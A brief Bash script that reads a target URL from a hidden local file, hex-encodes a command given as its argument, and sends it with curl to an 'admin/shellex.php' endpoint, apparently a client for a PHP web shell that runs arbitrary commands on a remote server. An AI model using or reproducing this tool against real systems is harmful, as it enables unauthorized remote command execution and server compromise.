if [ $# -eq 0 ]; then
    echo "Error: no command provided."
    echo "Usage is: rn <command>"
    exit 1
fi

url=$(cat ./.u)

encodedCommand=$(echo -n "$1" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')

curl $url"admin/shellex.php?raw=1&cmd=$encodedCommand"
